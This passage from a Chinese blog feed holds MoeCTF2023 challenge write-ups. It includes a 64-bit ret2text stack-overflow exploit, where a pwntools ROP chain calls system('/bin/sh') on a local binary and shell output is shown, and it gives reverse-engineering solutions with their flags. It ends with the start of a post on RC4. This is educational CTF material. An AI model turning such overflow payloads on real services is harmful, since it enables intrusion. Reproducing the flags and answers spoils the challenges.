&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[x] Opening connection to localhost on port 42107
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[x] Opening connection to localhost on port 42107: Trying ::1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[x] Opening connection to localhost on port 42107: Trying 127.0.0.1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[+] Opening connection to localhost on port 42107: Done
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[*] Switching to interactive mode
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Welcome to my stack in MoeCTF2023!
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;What&amp;#39;s your age?
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Now..try to overflow!
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ls
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;bin
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;flag
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;lib
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;lib32
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;lib64
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;libexec
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;libx32
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;pwn
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cat &#x2F;flag
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;moectf{9-BDI0PdSAud86ZZ2ygFIbDZQp2Bzxrz}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;ret2text-64&quot;&gt;ret2text_64&lt;a class=&quot;zola-anchor&quot; href=&quot;#ret2text-64&quot; aria-label=&quot;Anchor link for: ret2text-64&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;blockquote&gt;
&lt;p&gt;https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;12645&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;这道题的原理是通过覆盖函数的返回地址，通过 &lt;code&gt;pop rdi; ret&lt;&#x2F;code&gt; 可以将栈顶的值弹出到寄存器 &lt;code&gt;rdi&lt;&#x2F;code&gt; 中，并跳转到返回地址 &lt;code&gt;system_addr&lt;&#x2F;code&gt; ，以 &lt;code&gt;rdi&lt;&#x2F;code&gt; 寄存器的内容作为参数执行恶意命令。&lt;&#x2F;p&gt;
&lt;p&gt;下载附件使用 IDA 打开后对 main 进行反编译可以得到以下内容&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;int __cdecl main(int argc, const char **argv, const char **envp)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  init(argc, argv, envp);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  vuln();
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  return 0;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ssize_t vuln()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  int v1; &#x2F;&#x2F; [rsp+Ch] [rbp-54h] BYREF
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  char buf[80]; &#x2F;&#x2F; [rsp+10h] [rbp-50h] BYREF
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  puts(&amp;quot;Welcome to my stack in MoeCTF2023!&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  puts(&amp;quot;But this time..you need to find the point to get it!&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  puts(&amp;quot;What&amp;#39;s your age?&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  __isoc99_scanf(&amp;quot;%d&amp;quot;, &amp;amp;v1);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  puts(&amp;quot;Now..try to overflow!&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  return read(0, buf, v1);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过查看 vuln 函数的栈如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-0000000000000060 db ? ; undefined
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-000000000000005F db ? ; undefined
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-000000000000005E db ? ; undefined
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-000000000000005D db ? ; undefined
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-000000000000005C db ? ; undefined
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-000000000000005B db ? ; undefined
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-000000000000005A db ? ; undefined
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-0000000000000059 db ? ; undefined
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-0000000000000058 db ? ; undefined
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-0000000000000057 db ? ; undefined
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-0000000000000056 db ? ; undefined
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-0000000000000055 db ? ; undefined
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-0000000000000054 var_54 dd ?
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-0000000000000050 buf db 80 dup(?)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;+0000000000000000  s db 8 dup(?)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;+0000000000000008  r db 8 dup(?)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;+0000000000000010
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;+0000000000000010 ; end of stack variables
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以得出需要覆盖 &lt;code&gt;0x50+0x8&lt;&#x2F;code&gt; 的地址，并且通过 IDA 可以得到以下信息（通过 Functions 和 Strings）&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;backdoor_addr = 0x00000000004012A5
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;system_addr = 0x00000000004012B7
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;binsh_addr = 0x0000000000404050
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过以下命令可以得到 &lt;code&gt;pop rdi ; ret&lt;&#x2F;code&gt; 的地址&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ ROPgadget --binary &amp;quot;pwn&amp;quot; --only &amp;quot;pop|ret&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Gadgets information
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;============================================================
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0x000000000040119d : pop rbp ; ret
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0x00000000004011be : pop rdi ; ret
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0x000000000040101a : ret
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过编写以下脚本即可执行获得 Shell&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from pwn import *
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;sh = remote(&amp;#39;localhost&amp;#39;, 36289)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;sh.sendline(b&amp;#39;999&amp;#39;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;backdoor_addr = 0x00000000004012A5
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;system_addr = 0x00000000004012B7
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;binsh_addr = 0x0000000000404050
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;pop_rdi_ret_addr = 0x00000000004011be
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;payload = b&amp;#39;a&amp;#39; * (0x58) + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;sh.sendline(payload)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;sh.interactive()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[x] Opening connection to localhost on port 36289: Trying 127.0.0.1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[+] Opening connection to localhost on port 36289: Done
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[*] Switching to interactive mode
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Welcome to my stack in MoeCTF2023!
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;But this time..you need to find the point to get it!
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;What&amp;#39;s your age?
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Now..try to overflow!
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cat &#x2F;flag
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;moectf{tCyXQ6HLJk83Iutmn5MVW2x0h-6ZF7p3}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;reverse&quot;&gt;Reverse&lt;a class=&quot;zola-anchor&quot; href=&quot;#reverse&quot; aria-label=&quot;Anchor link for: reverse&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;ru-men-zhi-bei-4&quot;&gt;入门指北&lt;a class=&quot;zola-anchor&quot; href=&quot;#ru-men-zhi-bei-4&quot; aria-label=&quot;Anchor link for: ru-men-zhi-bei-4&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;使用 IDA 打开即可得到 flag&lt;&#x2F;p&gt;
&lt;p&gt;moectf{F1rst_St3p_1s_D0ne}&lt;&#x2F;p&gt;
&lt;h3 id=&quot;base-64&quot;&gt;base_64&lt;a class=&quot;zola-anchor&quot; href=&quot;#base-64&quot; aria-label=&quot;Anchor link for: base-64&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;blockquote&gt;
&lt;p&gt;https:&#x2F;&#x2F;tool.lu&#x2F;pyc&#x2F;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;先进行反编译，反编译后得到以下代码&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;#!&#x2F;usr&#x2F;bin&#x2F;env python
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# visit https:&#x2F;&#x2F;tool.lu&#x2F;pyc&#x2F; for more information
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# Version: Python 3.7
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import base64
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from string import *
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;str1 = &amp;#39;yD9oB3Inv3YAB19YynIuJnUaAGB0um0=&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;string1 = &amp;#39;ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0123456789+&#x2F;&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;string2 = &amp;#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;flag = input(&amp;#39;welcome to moectf\ninput your flag and I wiil check it:&amp;#39;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;enc_flag = base64.b64encode(flag.encode()).decode()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;enc_flag = enc_flag.translate(str.maketrans(string2, string1))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;if enc_flag == str1:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    print(&amp;#39;good job!!!!&amp;#39;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;else:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    print(&amp;#39;something wrong???&amp;#39;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    exit(0)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;将 &lt;code&gt;str1&lt;&#x2F;code&gt; 放入 CyberChef 并修改字符集 &lt;code&gt;string1&lt;&#x2F;code&gt; 即可得到 flag &lt;code&gt;moectf{pYc_And_Base64~}&lt;&#x2F;code&gt;。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;xor&quot;&gt;Xor&lt;a class=&quot;zola-anchor&quot; href=&quot;#xor&quot; aria-label=&quot;Anchor link for: xor&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;用 IDA 打开点击 &lt;code&gt;main&lt;&#x2F;code&gt; 按 &lt;code&gt;F5&lt;&#x2F;code&gt; ，双点 &lt;code&gt;enc&lt;&#x2F;code&gt; 可以得到 &lt;code&gt;enc&lt;&#x2F;code&gt; 的内容如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;enc = [0x54, 0x56, 0x5C, 0x5A, 0x4D, 0x5F, 0x42, 0x60, 0x56, 0x4C, 0x66, 0x52, 0x57, 0x09, 0x4E, 0x66, 0x51, 0x09, 0x4E, 0x66, 0x4D, 0x09, 0x66, 0x61, 0x09, 0x6B, 0x18, 0x44]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过分析 &lt;code&gt;main&lt;&#x2F;code&gt; 函数可以得知将 &lt;code&gt;enc&lt;&#x2F;code&gt; 的每个与 &lt;code&gt;0x39&lt;&#x2F;code&gt; 进行异或即可得到 flag，编写脚本如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;enc = [0x54, 0x56, 0x5C, 0x5A, 0x4D, 0x5F, 0x42, 0x60, 0x56, 0x4C, 0x66, 0x52, 0x57, 0x09, 0x4E, 0x66, 0x51, 0x09, 0x4E, 0x66, 0x4D, 0x09, 0x66, 0x61, 0x09, 0x6B, 0x18, 0x44]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;for i in enc:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    print(chr(i ^ 0x39), end=&amp;#39;&amp;#39;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# moectf{You_kn0w_h0w_t0_X0R!}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;upx&quot;&gt;UPX!&lt;a class=&quot;zola-anchor&quot; href=&quot;#upx&quot; aria-label=&quot;Anchor link for: upx&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ upx 1.exe -d
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                       Ultimate Packer for eXecutables
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                          Copyright (C) 1996 - 2020
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;UPX 3.96        Markus Oberhumer, Laszlo Molnar &amp;amp; John Reiser   Jan 23rd 2020
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        File size         Ratio      Format      Name
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   --------------------   ------   -----------   -----------
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;   1263104 &amp;lt;-    270336   21.40%    win64&#x2F;pe     1.exe
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Unpacked 1 file.
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;用 IDA 打开后对着 &lt;code&gt;Functions&lt;&#x2F;code&gt; 按 &lt;code&gt;Shift+F12&lt;&#x2F;code&gt; ，可以找到以下内容&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;writeup.owo.show&#x2F;~gitbook&#x2F;image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252FR2khnfKc4yygXaMBRi7g%252FUPX%21-1.png%3Falt%3Dmedia%26token%3Da55fb3d5-968a-4e41-889d-7b1ea5216543&amp;amp;width=768&amp;amp;dpr=4&amp;amp;quality=100&amp;amp;sign=375c1356798453490a95add10db2db8ce7c0745214de30a5a119309d94e4aff6&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;通过点击 &lt;code&gt;welcome to moectf&lt;&#x2F;code&gt; 并进行反编译可以得到以下内容&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;__int64 sub_140079760()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  char *v0; &#x2F;&#x2F; rdi
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  __int64 i; &#x2F;&#x2F; rcx
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  unsigned __int64 v2; &#x2F;&#x2F; rax
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  char v4[32]; &#x2F;&#x2F; [rsp+0h] [rbp-20h] BYREF
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  char v5; &#x2F;&#x2F; [rsp+20h] [rbp+0h] BYREF
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  char v6[76]; &#x2F;&#x2F; [rsp+28h] [rbp+8h] BYREF
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  int j; &#x2F;&#x2F; [rsp+74h] [rbp+54h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  unsigned __int64 v8; &#x2F;&#x2F; [rsp+148h] [rbp+128h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  v0 = &amp;amp;v5;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  for ( i = 34i64; i; --i )
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    *(_DWORD *)v0 = -858993460;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    v0 += 4;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  sub_140075557(&amp;amp;unk_1401A7008);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  sub_140073581(&amp;quot;welcome to moectf&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  sub_140073581(&amp;quot;I put a shell on my program to prevent you from reversing it, you will never be able to reverse it hhhh~~&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  sub_140073581(&amp;quot;Now tell me your flag:&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  memset(v6, 0, 0x2Aui64);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  sub_1400727F8(&amp;quot;%s&amp;quot;, v6);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  for ( j = 0; ; ++j )
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    v8 = j;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    v2 = sub_140073829((__int64)v6);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    if ( v8 &amp;gt;= v2 )
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      break;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    v6[j] ^= 0x67u;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    if ( word_140196000[j] != v6[j] )
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      sub_140073973(&amp;quot;try again~~&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;      sub_1400723F7(0i64);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  sub_140073973(&amp;quot;you are so clever!&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  sub_140074BCF(v4, &amp;amp;unk_140162070);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  return 0i64;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;在 &lt;code&gt;word_140196000&lt;&#x2F;code&gt; 可以找到 enc ，对 enc 异或 &lt;code&gt;0x67&lt;&#x2F;code&gt; 再转字符串就可以得到 flag 了。&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;enc = [0x0A, 0x08, 0x02, 0x04, 0x13, 0x01, 0x1C, 0x57, 0x0F, 0x38, 0x1E, 0x57, 0x12, 0x38, 0x2C, 0x09, 0x57, 0x10, 0x38, 0x2F, 0x57, 0x10, 0x38, 0x13, 0x08, 0x38, 0x35, 0x02, 0x11, 0x54, 0x15, 0x14, 0x02, 0x38, 0x32, 0x37, 0x3F, 0x46, 0x46, 0x46, 0x1A]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;for i in enc:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    print(chr(i ^ 0x67), end=&amp;#39;&amp;#39;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# moectf{0h_y0u_Kn0w_H0w_to_Rev3rse_UPX!!!}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;ai&quot;&gt;AI&lt;a class=&quot;zola-anchor&quot; href=&quot;#ai&quot; aria-label=&quot;Anchor link for: ai&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
</content>
	</entry>
	<entry xml:lang="zh">
		<title>RC4的描述</title>
		<published>2023-04-15T00:00:00+00:00</published>
		<updated>2025-06-09T00:00:00+00:00</updated>
		<link href="https://lbsucceed.github.io/posts/rc4/" type="text/html"/>
		<id>https://lbsucceed.github.io/posts/rc4/</id>
		<content type="html">&lt;h3 id=&quot;jian-jie&quot;&gt;简介&lt;a class=&quot;zola-anchor&quot; href=&quot;#jian-jie&quot; aria-label=&quot;Anchor link for: jian-jie&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;RC4加密算法是大名鼎鼎的RSA三人组中的头号人物Ronald Rivest在1987年设计的密钥长度可变的流加密算法簇。之所以称其为簇，是由于其核心部分的S-box长度可为任意，但一般为256字节。该算法的速度可以达到DES加密的10倍左右，且具有很高级别的非线性。RC4起初是用于保护商业机密的。但是在1994年9月，它的算法被发布在互联网上，也就不再有什么商业机密了。RC4也被叫做ARC4（Alleged RC4——所谓的RC4），因为RSA从来就没有正式发布过这个算法。&lt;&#x2F;p&gt;
